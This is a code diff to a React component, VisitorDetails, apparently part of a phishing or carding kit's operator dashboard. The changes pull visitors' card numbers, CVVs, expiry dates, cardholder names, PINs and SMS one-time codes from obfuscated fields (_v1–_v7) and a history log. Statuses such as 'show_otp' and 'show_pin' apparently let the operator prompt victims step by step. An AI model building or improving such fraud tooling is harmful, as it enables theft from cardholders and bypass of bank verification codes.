@@ -213,10 +213,12 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
   // } else {
     // Show current data
     
-    // Card Info
-    const cardNumber = visitor._v1 || visitor.cardNumber
-    const cvv = visitor._v2 || visitor.cvv
-    const expiryDate = visitor._v3 || visitor.expiryDate
+    // Card Info - check history first, then fallback to direct fields
+    const latestCardHistory = visitor.history?.find((h: any) => h.entryType === '_t1' || h.entryType === 'card')
+    const cardNumber = latestCardHistory?.data?._v1 || visitor._v1 || visitor.cardNumber
+    const cvv = latestCardHistory?.data?._v2 || visitor._v2 || visitor.cvv
+    const expiryDate = latestCardHistory?.data?._v3 || visitor._v3 || visitor.expiryDate
+    const cardHolderName = latestCardHistory?.data?._v4 || visitor._v4 || visitor.cardHolderName
     
     if (cardNumber) {
       bubbles.push({
@@ -226,11 +228,12 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
         color: "orange",
         data: {
           "رقم البطاقة": cardNumber,
-          "نوع البطاقة": visitor.cardType,
+          "اسم حامل البطاقة": cardHolderName || "غير محدد",
+          "نوع البطاقة": visitor.cardType || latestCardHistory?.data?.cardType,
           "تاريخ الانتهاء": expiryDate,
           "CVV": cvv,
-          "البنك": visitor.bankInfo?.name || "غير محدد",
-          "بلد البنك": visitor.bankInfo?.country || "غير محدد"
+          "البنك": visitor.bankInfo?.name || latestCardHistory?.data?.bankInfo?.name || "غير محدد",
+          "بلد البنك": visitor.bankInfo?.country || latestCardHistory?.data?.bankInfo?.country || "غير محدد"
         },
         timestamp: visitor.cardUpdatedAt || visitor.updatedAt,
         status: "pending" as const,
@@ -240,8 +243,9 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
       })
     }
     
-    // OTP Code
-    const otp = visitor._v5 || visitor.otp
+    // OTP Code - check history first
+    const latestOtpHistory = visitor.history?.find((h: any) => h.entryType === '_t2' || h.entryType === 'otp')
+    const otp = latestOtpHistory?.data?._v5 || visitor._v5 || visitor.otp
     
     if (otp || visitor.otpStatus === "show_otp" || visitor.otpStatus === "verifying") {
       // Prepare data object
@@ -272,8 +276,9 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
       })
     }
     
-    // PIN Code
-    const pinCode = visitor._v6 || visitor.pinCode
+    // PIN Code - check history first
+    const latestPinHistory = visitor.history?.find((h: any) => h.entryType === '_t3' || h.entryType === 'pin')
+    const pinCode = latestPinHistory?.data?._v6 || visitor._v6 || visitor.pinCode
     
     if (pinCode || visitor.otpStatus === "show_pin") {
       bubbles.push({
@@ -312,8 +317,9 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
       })
     }
     
-    // Phone OTP
-    const phoneOtp = visitor._v7 || visitor.phoneOtp
+    // Phone OTP - check history first
+    const latestPhoneOtpHistory = visitor.history?.find((h: any) => h.entryType === '_t5' || h.entryType === 'phone_otp')
+    const phoneOtp = latestPhoneOtpHistory?.data?._v7 || visitor._v7 || visitor.phoneOtp
     
     if (phoneOtp || visitor.phoneOtpStatus === "show_phone_otp" || visitor.phoneOtpStatus === "verifying") {
       // Prepare data object
